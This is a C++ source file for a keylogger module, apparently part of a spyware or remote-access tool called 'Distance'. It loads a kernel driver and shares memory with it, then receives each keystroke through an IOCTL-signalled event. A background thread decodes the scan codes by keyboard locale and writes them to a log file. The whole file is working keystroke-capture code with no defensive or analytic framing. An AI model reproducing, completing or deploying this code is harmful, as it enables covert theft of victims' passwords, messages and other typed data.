#include "KeyloggerModule.hpp"

namespace Distance
{

    KeyloggerModule::KeyloggerModule()
        : keylogger_(nullptr),
        Device_(nullptr), Event_(nullptr),
        SectionHandle_(nullptr), sectionBaseAddress_(nullptr),
        sectionSize_{ 0 }, sectionViewSize_(0u), isWork_(false)
    {
        logfile_ = CreateFileA(
            g_KeyloggerPathToLogFile,
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );
        if (logfile_ == INVALID_HANDLE_VALUE)
            throw xstar::WinAPIException();
    }



    KeyloggerModule::~KeyloggerModule()
    {
        stop();
    }



    void KeyloggerModule::start()
    {
        keylogger_ = new xstar::StartWinDriver(driverName_);

        Device_ = CreateFileW(
            driverPath_,
            GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            0,
            nullptr
        );
        if (Device_ == INVALID_HANDLE_VALUE)
        {
            throw xstar::WinAPIException();
        }


        OBJECT_ATTRIBUTES obj;
        InitializeObjectAttributes(
            &obj,
            &sectionName_,
            OBJ_CASE_INSENSITIVE,
            nullptr,
            nullptr
        );


        sectionSize_.LowPart = PAGE_SIZE;
        auto status = NtCreateSection(
            &SectionHandle_,
            SECTION_MAP_READ | SECTION_MAP_WRITE,
            &obj,
            &sectionSize_,
            PAGE_READWRITE,
            SEC_COMMIT,
            nullptr /*swap file*/
        );
        if (!NT_SUCCESS(status))
        {
            throw xstar::WinAPIException("NtCreateSection", status);
        }


        status = NtMapViewOfSection(
            SectionHandle_,
            NtCurrentProcess(),
            &sectionBaseAddress_,
            0,
            PAGE_SIZE,
            nullptr,
            &sectionViewSize_,
            SECTION_INHERIT::ViewShare,
            0,
            PAGE_READWRITE
        );
        if (!NT_SUCCESS(status))
        {
            throw xstar::WinAPIException("NtMapViewOfSection", status);
        }


        Event_ = CreateEventW(
            nullptr,
            FALSE, /*auto reset*/
            FALSE, /*non signal*/
            nullptr /*no name*/
        );
        if (Event_ == nullptr)
        {
            throw xstar::WinAPIException();
        }


        DWORD bytes_;
        auto successed = DeviceIoControl(
            Device_,
            IOCTL_DISTANCE_KEYLOGGER,
            &Event_, sizeof(HANDLE),
            nullptr, 0u,
            &bytes_,
            nullptr
        );
        if (!successed)
        {
            throw xstar::WinAPIException();
        }


        auto lstat = RegOpenKeyEx(
            HKEY_LOCAL_MACHINE,
            _T("SOFTWARE\\Microsoft\\Input\\Locales"),
            0,
            KEY_QUERY_VALUE,
            &KeyToLocales_
        );
        if (lstat != ERROR_SUCCESS)
        {
            throw xstar::WinAPIException("RegOpenKeyEx", lstat);
        }


        isWork_ = true;
        std::thread thread_keylogger = std::thread(
            keylogger_utils::KeyloggerRoutine, this
        );
        thread_keylogger.detach();
    }



    void KeyloggerModule::stop()
    {
        if (isWork_.load())
            isWork_.store(false);


        mutex_.lock();

        SetEvent(Event_); // Release Event
        CloseHandle(Event_);

        NtUnmapViewOfSection(NtCurrentProcess(), sectionBaseAddress_);

        mutex_.unlock();

        if (KeyToLocales_)
            RegCloseKey(KeyToLocales_);
        CloseHandle(logfile_);
        NtClose(SectionHandle_);
        CloseHandle(Device_);
        delete keylogger_;
    }



    void keylogger_utils::KeyloggerRoutine(KeyloggerModule* controller)
    {
        int countWords = 0;
        DWORD bytes = 0;
        PKEYBOARD_INPUT_DATA keyboard;
        std::wstring utf16Key;

        while (controller->isWork_.load())
        {
            controller->mutex_.lock();

            WaitForSingleObject(controller->Event_, INFINITE);

            keyboard = 
            static_cast<PKEYBOARD_INPUT_DATA>(controller->sectionBaseAddress_);

            utf16Key = VKeyToStringW
            (
                MakeCodeToVKeyCode(keyboard->MakeCode),
                controller->KeyToLocales_
            );

            WriteFile(
                controller->logfile_,
                utf16Key.c_str(),
                (DWORD)utf16Key.length() * sizeof(wchar_t),
                &bytes,
                nullptr
            );

            ++countWords;
            if (countWords == controller->QuantitySymbols)
            {
                WriteFile(
                    controller->logfile_,
                    L"\n",
                    sizeof(wchar_t) * 2,
                    &bytes,
                    nullptr
                );
                countWords = 0;
            }

            // if (keyboard->MakeCode == controller->OffKeylogger)
            //     controller->isWork_ = false;

            controller->mutex_.unlock();
        }
    }

} // Distance